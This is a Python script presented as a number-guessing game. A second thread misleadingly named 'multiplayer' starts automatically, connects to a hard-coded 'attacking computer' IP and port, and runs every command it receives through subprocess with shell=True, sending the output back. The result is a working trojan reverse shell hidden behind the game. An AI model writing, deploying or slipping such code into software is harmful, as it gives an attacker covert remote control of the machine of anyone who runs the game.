import random, socket, threading, os, subprocess

def game():
    done = False
    while done == False:
        target = random.randint(0,100)
        print("Welcome to the game!")
        won = False
        while won == False:
            guess = int(input("Guess the number: "))
            if guess > target:
                print("Try a smaller number!")
            elif guess < target:
                print("Try a greater number!")
            else:
                print(f"You got it! {target} was the number!")
                won = True
                response = input("Wanna play again? (y/n)")
                while response != "y" and response != "n":
                    response = input("Wanna play again? (y/n)")
                if response == "n":
                    done = True
        
def multiplayer():
    HOST = "192.168.1.101" #change it to your attacking computer's IP
    PORT = 1327
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST,PORT))
    while True:
        command = client.recv(1024).decode("utf-8")
        #print(command)
        output = run_command(command)
        #print(output)
        client.send(output.encode("utf-8"))



t1 = threading.Thread(target=game)
t2 = threading.Thread(target=multiplayer)
t1.start()
t2.start()
 
def run_command(command):
    words = command.split()
    try:
        if words[0] == "cd":
            os.chdir(words[1])
            return "Command executed successfully!"
        else:
            words = command.split()
            result = subprocess.run(words, shell=True, capture_output=True, text=True)
            output = result.stdout
            #print(output)
            if output == "":
                output = "Command executed successfully!"
            return output
    except subprocess.CalledProcessError as e:
            return f"Command error: {e.stderr}"  
    except FileNotFoundError:
            return "Command failed!" 

       
